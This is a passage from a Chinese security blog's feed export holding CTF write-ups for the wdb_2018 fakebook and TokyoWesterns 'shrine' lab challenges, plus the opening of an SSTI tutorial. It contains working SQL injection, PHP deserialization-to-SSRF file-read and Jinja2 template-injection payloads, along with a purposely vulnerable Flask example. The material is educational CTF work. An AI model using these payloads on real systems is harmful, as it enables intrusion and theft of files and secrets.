class="line">得到table: users</span><br><span class="line">-1/**/union/**/select/**/1,group_concat(column_name),3,4 <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">'users'</span>#</span><br><span class="line">得到column: <span class="literal">no</span>,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">-1/**/union/**/select/**/1,group_concat(data),3,4 <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">no</span>=<span class="string">'3'</span>#</span><br><span class="line">得到data: O:8:<span class="string">"UserInfo"</span>:3:&#123;s:4:<span class="string">"name"</span>;s:7:<span class="string">"abelche"</span>;s:3:<span class="string">"age"</span>;i:123;s:4:<span class="string">"blog"</span>;s:20:<span class="string">"http://www.baidu.com"</span>;&#125;</span><br></pre></td></tr></table></figure><p>结合在注入的时候页面显示php报错:<strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes in <strong>/var/www/html/view.php</strong> on line <strong>31</strong></p><p>用户注册的信息经过序列化后存入数据库，在view.php页面再反序列化成实例然后显示出来</p><h2 id="将unserialize-ssrf注入data"><a href="#将unserialize-ssrf注入data" class="headerlink" title="将unserialize+ssrf注入data"></a>将unserialize+ssrf注入data</h2><p>那么我们可以尝试构造序列化的payload读取flag.php</p><p>这就用到了前面获得的泄漏的源码</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$u = unserialize(<span class="string">'O:8:"UserInfo":3:&#123;s:4:"name";s:7:"abelche";s:3:"age";i:123;s:4:"blog";s:20:"http://www.baidu.com";&#125;'</span>);</span><br><span class="line">$s = $u;</span><br><span class="line">$s-&gt;blog = <span class="string">'file:///var/www/html/flag.php'</span>;</span><br><span class="line"><span class="keyword">print</span>(serialize($s));</span><br></pre></td></tr></table></figure><p>最终的payload为:</p><p><code>-1/**/union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:7:&quot;abelche&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;#</code></p><p>查看页面源码得到</p><p><img src="https://wjpbpw.sn.files.1drv.com/y4mC9zn_fxgwXErBdmHluORiBDYz3jO7ZBIRPb3ap1ilYR9UikdIjmGNhWtxe0cB4Lno8l1lWFqiEDJhF8D1GCapzhRupO17rxgoNcY7l9H9MUn44eFGhryeg3yExVE9oeoyf0q_IoWkZ339i3xMXo81B_ddbAe_iIvdm7iCJMbMCTBfspoXht3vtnzmMagu5skvUvlxtQ0jM_nFnEt5iOrbA?width=976&height=253&cropmode=none" alt></p><p>base64解码得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目复现&quot;&gt;&lt;a href=&quot;#题目复现&quot; class=&quot;headerlink&quot; title=&quot;题目复现&quot;&gt;&lt;/a&gt;题目复现&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/CTFTraining/wdb_2018_fakebook/tree/0de336f09a15dee090d6a001a5a29e60e647be8a&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/CTFTraining/wdb_2018_fakebook/tree/0de336f09a15dee090d6a001a5a29e60e647be8a&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/CTFTraining/wdb_2018_fakebook.git&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; wdb_2018_fakebook/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker run -d -p 1000:80 ctftraining/wdb_2018_fakebook&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;访问 http://[your ip]:1000/ 即可&lt;/p&gt;
    
    </summary>
    
      <category term="WriteUp" scheme="http://AbelChe.com/categories/WriteUp/"/>
    
    
      <category term="ssrf" scheme="http://AbelChe.com/tags/ssrf/"/>
    
      <category term="sql注入" scheme="http://AbelChe.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="unserialize" scheme="http://AbelChe.com/tags/unserialize/"/>
    
  </entry>
  
  <entry>
    <title>WP-TokyoWesterns CTF 4th 2018 shrine</title>
    <link href="http://AbelChe.com/2019/07/27/Writeup/WP-TokyoWesterns-CTF-4th-2018-shrine/"/>
    <id>http://AbelChe.com/2019/07/27/Writeup/WP-TokyoWesterns-CTF-4th-2018-shrine/</id>
    <published>2019-07-27T06:52:33.000Z</published>
    <updated>2019-08-15T11:02:02.458Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h1><p><a href="https://github.com/CTFTraining/westerns_2018_shrine/tree/3ed6a3c77c5f62cbf9ec39faebcbb06b0b668b51" target="_blank" rel="noopener">https://github.com/CTFTraining/westerns_2018_shrine/tree/3ed6a3c77c5f62cbf9ec39faebcbb06b0b668b51</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/CTFTraining/westerns_2018_shrine.git</span><br><span class="line"><span class="built_in">cd</span> westerns_2018_shrine</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker run -d -p 1000:5000 ctftraining/westerns_2018_shrine:latest</span><br></pre></td></tr></table></figure><p>访问 http://[你的ip]:1000/ 即可</p><a id="more"></a><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>打开页面就是一段源码，右键查看下源码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>明显是个 flask 在 /shrine/ 下的 SSTI</p><p>而且对 payload 进行了过滤</p><ul><li>对小括号进行了替换，将 <code>(</code> 和 <code>)</code> 替换为空字符串</li><li>将 config 和 self 添加进了黑名单</li></ul><h1 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://yzoedw.sn.files.1drv.com/y4mhbVz4dvrrB9Bsp5bz1GeVPtGiGhoJbCxmn0CBgjukhluAOKeSWCW1UcZyzNR9dPlXFmB8iyB4o-1Olg-kwfQKgAUDs76YrryH0G_KbQknJ4XD-luZ7ZE3PzILGPT8A_ch3dK8tUtLOnYD3on8pgwxND9wxtGkoIrju0JAImBBDk8z6kb8rFmcoNNZbZQgoNg89X8HRONKHIIs7b3Her-jw?width=558&height=99&cropmode=none" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>*<span class="string">'7'</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://yzobdw.sn.files.1drv.com/y4mxBpIEA-D63S7ouW3V8cxgkPhzXsQdzItrXqZZJ01E-TeZUBall5Eo1lIuuCO1Uf2veIS3Wxt-XvtHHSSsx5B-QMEs94E8Wi1P3St3VHkidYj0HUwy37eim7LNEd7Xu3sTDRsrLd7NMLd8b7goeZgFLRYrALA47vXMQ6NLOGAJISh2ppOp1MOTJZNBa7rKap_ts2wqsKqIt6JRKxeoFKrWg?width=577&height=85&cropmode=none" alt></p><p>测试发现是 jinja2 或 Twig，后端源码为 flask</p><p>所以这个是关于 flask + jinja2 的 SSTI </p><p>至于为什么，请看图</p><p><img src="https://q6fcrw.sn.files.1drv.com/y4myLNDZak2pCjhPIenf32kI7a3LLRkhH0Ir5BIv4Ffn6A7hmtH7rKKPjLPQ5H-n1Ehzisv7N3J1cZI3HxPSTIOguXF95B3z7i0AYW1DKfqLhEg-u6rZmPuu0Ro6T2tu14uOotDOS96PD-n60n7e4v6uquf8rquH1i5InQPcbnZld8TN1C2_MhZckiTGHFXJOWIakiBMEpaCHvJkF2TaFXVYw?width=640&height=386&cropmode=none" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://yzoddw.sn.files.1drv.com/y4m9msEgTT0lo_tgvsEds6Excn8kKA4RFIF1P7TBH_MqTAK-u3Jboo7gqJqCOA8CpABzvYyONdjflghFphpEkBmxuMoLhoC29zUEnsPsdLkuDKBtrJFYdDOghgMkIsHJ_DDkoLskv3C3LKOOelYeBjkilMt3juD6wxbsRW7iSHU0m0dLT7Uus5_fbfqpJ3IBwD1XF-ZdJrHRohblh5Cg5G22g?width=773&height=83&cropmode=none" alt></p><p>明显这里对 <code>()</code> 进行了过滤</p><p>只能从别的地方入手，例如 flask 的内置函数和变量，</p><p>当然，config 和 self 也被加入了黑名单</p><p>但通过变量去读取 app.config 也会涉及到 <code>()</code> 的使用</p><p>所以只剩下内置函数</p><p>get_flashed_messages(), url_for()</p><p>构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">'current_app'</span>].config[<span class="string">'FLAG'</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://yzocdw.sn.files.1drv.com/y4mwv7czHlNKjZ7Tl0LJx2VXFsBzgJyrCNPO64kYrY_sp6sET35LdP_x54pbDfXnHQByHM_mGhaALHetn0qJ5Zwx529YSZcIAlKZHBZcjVr3y5jSn8bIHBz7GE-rsTbwoHNFNOVdwfN1SvxOGygYeDW0VkOaYW_13X46H-nLm_5G5BCj3FXM303YFnaDTZ7ADkcRmd6nYGYLE_Q1mribvex5g?width=932&height=74&cropmode=none" alt></p><p>得到flag</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这是一道很简单很基础的 SSTI</p><p>总体思路就是</p><blockquote><ol><li>判断 SSTI 类型</li><li>分析过滤</li><li>构造 payload </li></ol></blockquote><p>最后，关于 SSTI :</p><p><a href="/2019/07/27/SSTI-服务端模板注入简析/">SSTI-服务端模板注入简析</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目复现&quot;&gt;&lt;a href=&quot;#题目复现&quot; class=&quot;headerlink&quot; title=&quot;题目复现&quot;&gt;&lt;/a&gt;题目复现&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/CTFTraining/westerns_2018_shrine/tree/3ed6a3c77c5f62cbf9ec39faebcbb06b0b668b51&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/CTFTraining/westerns_2018_shrine/tree/3ed6a3c77c5f62cbf9ec39faebcbb06b0b668b51&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/CTFTraining/westerns_2018_shrine.git&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; westerns_2018_shrine&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker run -d -p 1000:5000 ctftraining/westerns_2018_shrine:latest&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;访问 http://[你的ip]:1000/ 即可&lt;/p&gt;
    
    </summary>
    
      <category term="WriteUp" scheme="http://AbelChe.com/categories/WriteUp/"/>
    
    
      <category term="SSTI" scheme="http://AbelChe.com/tags/SSTI/"/>
    
      <category term="flask" scheme="http://AbelChe.com/tags/flask/"/>
    
      <category term="jinja2" scheme="http://AbelChe.com/tags/jinja2/"/>
    
  </entry>
  
  <entry>
    <title>从 flask+jinjia2 认识 SSTI 服务端模板注入</title>
    <link href="http://AbelChe.com/2019/07/27/SSTI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%AE%80%E6%9E%90/"/>
    <id>http://AbelChe.com/2019/07/27/SSTI-服务端模板注入简析/</id>
    <published>2019-07-27T06:45:17.000Z</published>
    <updated>2019-09-10T11:02:54.906Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://8ke7rw.sn.files.1drv.com/y4maedzleRsLFxdY5nF7fH88VfDC11rTKHBin0_-Havq7y5z6Ptgod5u_uLfRV1AbFpNIQYOpa0OEMa70_bz0tlETO78KV8ZrSqi9I5dGbTXv7Rem3JU-mZPth3QjkMisOsa_nstR_UQKWjGALwA_k9h3KOfJhnZFNRO6EZ66tBaVCs8CZVaK-CiUqzQgFgeZVd0GEgxCheZsVDOQ6plTqGIw?width=807&height=404&cropmode=none" alt></p><p>推荐文章 <a href="https://portswigger.net/blog/server-side-template-injection" target="_blank" rel="noopener">https://portswigger.net/blog/server-side-template-injection</a></p><p>以 flask+jinja2 的 SSTI 为例分析 SSTI</p><a id="more"></a><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>SSTI (Server-Side Template Injection) 服务端模板注入，那么要先了解模板是什么</p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让(网站)程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。</p><p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据(变量)到实际的视觉表现(HTML代码)这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p><p>通俗点理解:拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p><p>后端渲染:浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。</p><p>前端渲染:前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。</p><p>举个例子:(django)</p><blockquote><p>前端代码:index.html</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>后端代码:view.py</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'message'</span>: <span class="string">'hello world'</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">'index.html'</span>, data)</span><br></pre></td></tr></table></figure><p>那么当我们去访问 index.html 这个页面的时候页面从后端拿到message的数据<br>呈现给用户的页面显示为:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SSTI-1"><a href="#SSTI-1" class="headerlink" title="SSTI"></a>SSTI</h2><p>web 应用程序通过使用模板在网页中嵌入动态内容，那么如果显示的内容是用户可控的，可能首先会想到 XSS ，而存在 XSS 的地方很有可能存在 SSTI</p><p><img src="https://q6fbrw.sn.files.1drv.com/y4mejS9j8grOQ9skPUeAFuQviqVH03U4Jm629JbS4g1xWcTj4jtDdlcNQqz44K4k5ii-KhOpmuXUZ7LQa5WtJ2bi1PkGqI4AQtg9VkKysHTwnsI64B8U_MbUQPxJ0E3QJixjF_uc7Uuq-wQK_cWKjH25vpqN-WDW0Vj4taUCjlbroVJQO5yAAsvPWcJfmzg2GJyJl5mR7h7prm0c7iEVrNzWQ?width=807&height=225&cropmode=none" alt></p><h2 id="本地测试-flask-jinja2"><a href="#本地测试-flask-jinja2" class="headerlink" title="本地测试(flask + jinja2)"></a>本地测试(flask + jinja2)</h2><p>新建一个 flask 项目:</p><blockquote><p>app.py</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/hello/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">(name)</span>:</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'welcome.html'</span>, name=name)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/h/&lt;name&gt;', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name)</span>:</span></span><br><span class="line">    template = <span class="string">'''</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;hello %s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        '''</span> % name</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host=<span class="string">'127.0.0.1'</span>,</span><br><span class="line">        port=<span class="number">8000</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><blockquote><p>index.html</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this is a SSTI test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>hello &#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结果如图:</p><p><img src="https://q6eqrw.sn.files.1drv.com/y4mzrn1oKK7TVtR_0nKAA4ZWZ44HUBFaDgjaasQK_vFEEIMhZmBV2rixIdbdidKCNnaGePNbUO7rehzcVfguxXfd0h-8rMj_dGMiQQBOOgolqbpuRvG9539YgqFxgS4MJruOyPGjNIIgS0iAJVVsmjL8Tx4vl439ZkcQeFkaj7Zwm43fDatUcK1j5u5h5HJWnyz9J-ioInxnTbMVbjvAk74cg?width=794&height=124&cropmode=none" alt></p><p><img src="https://q6eprw.sn.files.1drv.com/y4m4ugGl9-dFBgF75-lHExaiK8nftBMRZPNhgaKt2b02ITX0QOVsbAmRVnk7i2NCECJs83EAZKhO1h9HhWSWWB1oRMGskSi9Ni6PF4Rfxsk6lUmOlCN4K09T91KGfF8B3Y4HIFn6NLO34X5peDNsaeG6nJLJwGvzZVK__Y09lohrP6ZBZeshwkLn6b1TxuLauSDPoMxxFCxys6s4evblSHELA?width=782&height=126&cropmode=none" alt></p><p>明显 flask 返回模板字符串的存在 XSS</p><p>第一个没有触发XSS的原因就是模板对符号进行了编码即用户对此不可控</p><p><img src="https://q6e9rw.sn.files.1drv.com/y4mSbC9IGRGhsWFqEbj103mM9rob-omkZheboqp3YYBf7f8ovUBfcrKELCGT8uicJbw2SaepMGbGqW0rorPpCB7nMYP-tO74XJ-CywzEAwG2U5qHfpHGhNyGvHEqgdmwmjYSJoMoFA30vxxMhQsQuq_4n-XSraq0j55RngxrT9uRXE_ib5eUs556k49Q6WRoQoq09ylaaLooZjjl0Kc0gFlpA?width=964&height=301&cropmode=none" alt></p><p>继续在触发 XSS 的点进行 SSTI 测试:<br>最简单的 payload : 